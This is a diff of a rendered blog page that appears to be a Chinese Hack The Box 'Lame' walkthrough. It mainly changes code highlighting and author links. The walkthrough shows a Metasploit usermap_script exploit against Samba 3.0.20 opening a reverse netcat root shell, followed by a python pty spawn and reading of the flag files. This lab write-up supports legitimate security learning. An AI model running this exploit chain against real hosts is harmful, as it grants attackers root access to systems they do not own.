@@ -148,7 +148,7 @@
 
   
     <div class="author__avatar">
-      <a href="https://yueyejian13.github.io">
+      <a>
         <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
       </a>
     </div>
@@ -156,7 +156,7 @@
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+      <a>yueyejian</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
@@ -388,78 +388,78 @@ Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                
 
 <p>直接用metasploit搜索<code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search samba 3.0.20
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search samba 3.0.20
 
 Matching Modules
-================
+<span class="o">================</span>
 
-   #  Name                                Disclosure Date  Rank       Check  Description
-   -  ----                                ---------------  ----       -----  -----------
+   <span class="c">#  Name                                Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
    0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No    
 </code></pre></div></div>
 <p>选择此模块并配置好反弹shell的相关参数，用<code class="language-plaintext highlighter-rouge">run</code>命令发起攻击，直接获取了root权限下的shell，直接打开root下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use 0
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit(multi/samba/usermap_script) &gt; show option
-[-] Invalid parameter "option", use "show -h" for more information
-msf6 exploit(multi/samba/usermap_script) &gt; show options
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show option
+<span class="o">[</span>-] Invalid parameter <span class="s2">"option"</span>, use <span class="s2">"show -h"</span> <span class="k">for </span>more information
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> show options
 
-Module options (exploit/multi/samba/usermap_script):
+Module options <span class="o">(</span>exploit/multi/samba/usermap_script<span class="o">)</span>:
 
    Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT   139              yes       The target port (TCP)
+   <span class="nt">----</span>    <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS                   <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
 
 
-Payload options (cmd/unix/reverse_netcat):
+Payload options <span class="o">(</span>cmd/unix/reverse_netcat<span class="o">)</span>:
 
    Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.32.134   yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  192.168.32.134   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
 
 
 Exploit target:
 
    Id  Name
-   --  ----
+   <span class="nt">--</span>  <span class="nt">----</span>
    0   Automatic
 
 
 
-View the full module info with the info, or info -d command.
+View the full module info with the info, or info <span class="nt">-d</span> command.
 
-msf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
-rhost =&gt; 10.10.10.3
-msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
-rport =&gt; 445
-msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4
-lhost =&gt; 10.10.14.4
-msf6 exploit(multi/samba/usermap_script) &gt; set lport 2333
-lport =&gt; 2333
-msf6 exploit(multi/samba/usermap_script) &gt; run
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost 10.10.10.3
+rhost <span class="o">=&gt;</span> 10.10.10.3
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 445
+rport <span class="o">=&gt;</span> 445
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.4
+lhost <span class="o">=&gt;</span> 10.10.14.4
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 2333
+lport <span class="o">=&gt;</span> 2333
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> run
 
-[*] Started reverse TCP handler on 10.10.14.4:2333 
-[*] Command shell session 1 opened (10.10.14.4:2333 -&gt; 10.10.10.3:40919) at 2023-04-22 00:22:42 -0400
-whoami
-root
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.4:2333 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.4:2333 -&gt; 10.10.10.3:40919<span class="o">)</span> at 2023-04-22 00:22:42 <span class="nt">-0400</span>
+<span class="nb">whoami
+</span>root
 which python
 /usr/bin/python
-python -c 'import pty;pty.spawn("/bin/bash")'
-root@lame:/# cat /root/root.txt
-cat /root/root.txt
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+root@lame:/# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
 162190c25286540dea9c0047e......
 </code></pre></div></div>
 <p>user下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / -name user.txt 2&gt;/dev/null
-find / -name user.txt 2&gt;/dev/null
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
+find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
 /home/makis/user.txt
-root@lame:/home# cat /makis/user.txt
-cat /makis/user.txt
-cat: /makis/user.txt: No such file or directory
-root@lame:/home# cat makis/user.txt
-cat makis/user.txt
+root@lame:/home# <span class="nb">cat</span> /makis/user.txt
+<span class="nb">cat</span> /makis/user.txt
+<span class="nb">cat</span>: /makis/user.txt: No such file or directory
+root@lame:/home# <span class="nb">cat </span>makis/user.txt
+<span class="nb">cat </span>makis/user.txt
 a5ceb51f1741b774fbee61a559......
 </code></pre></div></div>
 <h2 id="cve-2007-2447">CVE-2007-2447</h2>
